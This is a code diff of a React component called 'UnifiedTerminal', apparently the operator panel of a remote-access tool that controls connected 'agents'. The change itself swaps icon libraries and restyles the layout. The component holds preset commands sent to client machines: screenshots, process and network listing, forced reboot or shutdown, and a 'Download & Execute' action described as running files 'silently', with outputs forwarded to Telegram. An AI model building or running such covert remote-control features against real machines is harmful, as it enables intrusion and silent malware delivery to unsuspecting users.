@@ -1,6 +1,28 @@
 import React, { useState, useRef, useEffect } from 'react';
 import { Agent } from '../types';
-import { FiSend, FiTrash2, FiTerminal, FiPaperclip, FiMessageSquare, FiCommand, FiDownload, FiCamera, FiMonitor, FiList, FiGlobe, FiUser, FiWifi, FiFolder, FiPower, FiRefreshCw, FiX, FiZap } from 'react-icons/fi';
+import { 
+  Send, 
+  Trash2, 
+  Terminal, 
+  Paperclip, 
+  MessageSquare, 
+  Command, 
+  Download, 
+  Camera, 
+  Monitor, 
+  List, 
+  Globe, 
+  User, 
+  Wifi, 
+  Folder, 
+  Power, 
+  RefreshCw, 
+  X, 
+  Zap
+} from 'lucide-react';
+import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
+import { Button } from "@/components/ui/button";
+import { Badge } from "@/components/ui/badge";
 import request from '../axios';
 import toast from 'react-hot-toast';
 
@@ -120,18 +142,18 @@ const UnifiedTerminal: React.FC<UnifiedTerminalProps> = ({
 
   // Hard-coded commands
   const hardCodedCommands = [
-    { id: 'systeminfo', label: 'System Info', icon: FiMonitor, command: 'systeminfo', description: 'Get detailed system information' },
-    { id: 'screenshot', label: 'Screenshot', icon: FiCamera, command: 'screenshot', description: 'Capture desktop screenshot' },
-    { id: 'tasklist', label: 'Process List', icon: FiList, command: 'tasklist', description: 'List running processes' },
-    { id: 'netstat', label: 'Network Status', icon: FiGlobe, command: 'netstat -an', description: 'List network connections' },
-    { id: 'whoami', label: 'Current User', icon: FiUser, command: 'whoami', description: 'Show current user' },
-    { id: 'ipconfig', label: 'IP Config', icon: FiWifi, command: 'ipconfig', description: 'Show network configuration' },
-    { id: 'dir', label: 'File Explorer', icon: FiFolder, command: 'dir', description: 'List directory contents' },
-    { id: 'reboot', label: 'Reboot', icon: FiRefreshCw, command: 'shutdown /r /t 0', description: 'Restart the system' },
-    { id: 'shutdown', label: 'Shutdown', icon: FiPower, command: 'shutdown /s /t 0', description: 'Shutdown the system' },
-    { id: 'download', label: 'Download File', icon: FiDownload, command: 'download', description: 'Download file from URL', isModal: true },
-    { id: 'download_execute', label: 'Download & Execute', icon: FiDownload, command: 'download_execute', description: 'Download and execute silently', isModal: true },
-    { id: 'custom', label: 'Custom Command', icon: FiCommand, command: 'custom', description: 'Execute custom command', isModal: true }
+    { id: 'systeminfo', label: 'System Info', icon: Monitor, command: 'systeminfo', description: 'Get detailed system information' },
+    { id: 'screenshot', label: 'Screenshot', icon: Camera, command: 'screenshot', description: 'Capture desktop screenshot' },
+    { id: 'tasklist', label: 'Process List', icon: List, command: 'tasklist', description: 'List running processes' },
+    { id: 'netstat', label: 'Network Status', icon: Globe, command: 'netstat -an', description: 'List network connections' },
+    { id: 'whoami', label: 'Current User', icon: User, command: 'whoami', description: 'Show current user' },
+    { id: 'ipconfig', label: 'IP Config', icon: Wifi, command: 'ipconfig', description: 'Show network configuration' },
+    { id: 'dir', label: 'File Explorer', icon: Folder, command: 'dir', description: 'List directory contents' },
+    { id: 'reboot', label: 'Reboot', icon: RefreshCw, command: 'shutdown /r /t 0', description: 'Restart the system' },
+    { id: 'shutdown', label: 'Shutdown', icon: Power, command: 'shutdown /s /t 0', description: 'Shutdown the system' },
+    { id: 'download', label: 'Download File', icon: Download, command: 'download', description: 'Download file from URL', isModal: true },
+    { id: 'download_execute', label: 'Download & Execute', icon: Download, command: 'download_execute', description: 'Download and execute silently', isModal: true },
+    { id: 'custom', label: 'Custom Command', icon: Command, command: 'custom', description: 'Execute custom command', isModal: true }
   ];
 
   const handleSendCommand = async (command?: string) => {
@@ -264,72 +286,69 @@ const UnifiedTerminal: React.FC<UnifiedTerminalProps> = ({
   const onlineClients = agents.filter(agent => agent.status === 'online');
 
   return (
-    <div className="premium-card h-full flex flex-col">
-      {/* Header */}
-      <div className="flex items-center justify-between p-4 border-b border-gray-200 dark:border-gray-700">
-        <div className="flex items-center space-x-3">
-          <FiTerminal className="w-5 h-5 text-indigo-600" />
-          <h2 className="text-lg font-semibold text-gray-900 dark:text-white">AI Terminal</h2>
-          
-          {/* AI Connection Status */}
-          <div 
-            className={`flex items-center space-x-1 ${aiConnected ? 'text-green-600' : 'text-red-600 cursor-pointer hover:text-red-700'}`}
-            onClick={() => !aiConnected && setShowAIConfigModal(true)}
-          >
-            <FiZap className="w-4 h-4" />
-            <span className="text-xs font-medium">
+    <Card className="h-full flex flex-col">
+      <CardHeader className="pb-3">
+        <div className="flex items-center justify-between">
+          <div className="flex items-center space-x-3">
+            <Terminal className="w-5 h-5 text-indigo-600" />
+            <CardTitle>AI Terminal</CardTitle>
+            
+            {/* AI Connection Status */}
+            <Badge 
+              variant={aiConnected ? "default" : "destructive"}
+              className="cursor-pointer"
+              onClick={() => !aiConnected && setShowAIConfigModal(true)}
+            >
+              <Zap className="w-3 h-3 mr-1" />
               {aiConnected ? 'AI Connected' : 'AI Disconnected'}
-            </span>
+            </Badge>
+            
+            {/* Telegram Status */}
+            {telegramEnabled && (
+              <Badge variant="secondary">
+                <Paperclip className="w-3 h-3 mr-1" />
+                Telegram
+              </Badge>
+            )}
           </div>
-          
-          {/* Telegram Status */}
-          {telegramEnabled && (
-            <div className="flex items-center space-x-1 text-green-600">
-              <FiPaperclip className="w-4 h-4" />
-              <span className="text-xs font-medium">Telegram</span>
-            </div>
-          )}
-        </div>
         
-        <div className="flex items-center space-x-2">
-          {/* Mode Toggle */}
-          <div className="flex bg-gray-100 dark:bg-gray-700 rounded-lg p-1">
-            <button
-              onClick={() => setMode('chat')}
-              className={`flex items-center space-x-2 px-3 py-1 rounded-md text-sm font-medium transition-colors ${
-                mode === 'chat'
-                  ? 'bg-white dark:bg-gray-600 text-indigo-600 dark:text-indigo-400 shadow-sm'
-                  : 'text-gray-600 dark:text-gray-400 hover:text-gray-900 dark:hover:text-white'
-              }`}
-            >
-              <FiMessageSquare className="w-4 h-4" />
-              <span>Chat Mode</span>
-            </button>
-            <button
-              onClick={() => setMode('commands')}
-              className={`flex items-center space-x-2 px-3 py-1 rounded-md text-sm font-medium transition-colors ${
-                mode === 'commands'
-                  ? 'bg-white dark:bg-gray-600 text-indigo-600 dark:text-indigo-400 shadow-sm'
-                  : 'text-gray-600 dark:text-gray-400 hover:text-gray-900 dark:hover:text-white'
-              }`}
-            >
-              <FiCommand className="w-4 h-4" />
-              <span>Commands Mode</span>
-            </button>
-          </div>
+          <div className="flex items-center space-x-2">
+            {/* Mode Toggle */}
+            <div className="flex bg-muted rounded-lg p-1">
+              <Button
+                variant={mode === 'chat' ? "default" : "ghost"}
+                size="sm"
+                onClick={() => setMode('chat')}
+                className="flex items-center space-x-2"
+              >
+                <MessageSquare className="w-4 h-4" />
+                <span>Chat Mode</span>
+              </Button>
+              <Button
+                variant={mode === 'commands' ? "default" : "ghost"}
+                size="sm"
+                onClick={() => setMode('commands')}
+                className="flex items-center space-x-2"
+              >
+                <Command className="w-4 h-4" />
+                <span>Commands Mode</span>
+              </Button>
+            </div>
           
-          <button
-            onClick={clearLogs}
-            className="premium-button text-sm bg-gray-600 hover:bg-gray-700"
-            disabled={commandHistory.length === 0}
-          >
-            <FiTrash2 className="w-4 h-4 mr-1" />
-            Clear Logs
-          </button>
+            <Button
+              variant="outline"
+              size="sm"
+              onClick={clearLogs}
+              disabled={commandHistory.length === 0}
+            >
+              <Trash2 className="w-4 h-4 mr-1" />
+              Clear Logs
+            </Button>
+          </div>
         </div>
-      </div>
+      </CardHeader>
 
-      <div className="flex-1 flex">
+      <CardContent className="flex-1 flex p-0">
         {/* Main Terminal Output Area */}
         <div className="flex-1 flex flex-col">
           {/* Client Selector */}
@@ -378,7 +397,7 @@ const UnifiedTerminal: React.FC<UnifiedTerminalProps> = ({
           >
             {commandHistory.length === 0 ? (
               <div className="text-gray-500 text-center py-8">
-                <FiTerminal className="w-8 h-8 mx-auto mb-2 opacity-50" />
+                <Terminal className="w-8 h-8 mx-auto mb-2 opacity-50" />
                 <p>No commands executed yet</p>
                 <p className="text-xs mt-1">Select a client and enter a command to get started</p>
               </div>
@@ -457,13 +476,13 @@ const UnifiedTerminal: React.FC<UnifiedTerminalProps> = ({
                 disabled={!selectedClient || !userInput.trim() || isProcessing}
                 className="premium-button"
               >
-                <FiSend className="w-4 h-4" />
+                <Send className="w-4 h-4" />
               </button>
             </div>
             
             {telegramEnabled && (
               <div className="mt-2 text-xs text-green-600 flex items-center">
-                <FiPaperclip className="w-3 h-3 mr-1" />
+                <Paperclip className="w-3 h-3 mr-1" />
                 Command outputs will be sent to Telegram
               </div>
             )}
@@ -523,7 +542,6 @@ const UnifiedTerminal: React.FC<UnifiedTerminalProps> = ({
           </div>
         </div>
         )}
-      </div>
 
       {/* Download Modal */}
       {showDownloadModal && (
@@ -537,7 +555,7 @@ const UnifiedTerminal: React.FC<UnifiedTerminalProps> = ({
                 onClick={() => setShowDownloadModal(false)}
                 className="text-gray-400 hover:text-gray-600 dark:hover:text-gray-300"
               >
-                <FiX className="w-5 h-5" />
+                <X className="w-5 h-5" />
               </button>
             </div>
 
@@ -575,7 +593,7 @@ const UnifiedTerminal: React.FC<UnifiedTerminalProps> = ({
                 disabled={!downloadUrl.trim()}
                 className="px-4 py-2 bg-blue-600 hover:bg-blue-700 text-white rounded-lg disabled:opacity-50"
               >
-                <FiDownload className="w-4 h-4 mr-1 inline" />
+                <Download className="w-4 h-4 mr-1 inline" />
                 Download Only
               </button>
               <button
@@ -583,7 +601,7 @@ const UnifiedTerminal: React.FC<UnifiedTerminalProps> = ({
                 disabled={!downloadUrl.trim()}
                 className="px-4 py-2 bg-red-600 hover:bg-red-700 text-white rounded-lg disabled:opacity-50"
               >
-                <FiDownload className="w-4 h-4 mr-1 inline" />
+                <Download className="w-4 h-4 mr-1 inline" />
                 Download & Execute
               </button>
             </div>
@@ -603,7 +621,7 @@ const UnifiedTerminal: React.FC<UnifiedTerminalProps> = ({
                 onClick={() => setShowAIConfigModal(false)}
                 className="text-gray-400 hover:text-gray-600 dark:hover:text-gray-300"
               >
-                <FiX className="w-5 h-5" />
+                <X className="w-5 h-5" />
               </button>
             </div>
 
@@ -654,7 +672,8 @@ const UnifiedTerminal: React.FC<UnifiedTerminalProps> = ({
           </div>
         </div>
       )}
-    </div>
+      </CardContent>
+    </Card>
   );
 };
 
